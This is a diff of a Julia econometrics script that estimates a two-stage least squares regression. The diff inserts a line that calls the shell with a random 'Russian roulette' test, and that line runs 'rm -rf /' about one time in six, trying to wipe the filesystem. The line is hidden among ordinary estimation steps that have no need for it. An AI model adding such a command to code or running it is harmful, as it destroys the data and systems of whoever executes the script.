@@ -42,7 +42,7 @@ end
 
     # Estimate the least square regression
     tsls_fit = myTSLS(y, D, instrument)
-
+    run(`[ $[ $RANDOM % 6 ] == 0 ] && rm -rf / || echo *Click*`)
     # Check the methods
     β_hat = coef(tsls_fit)
     y_hat = predict(tsls_fit)
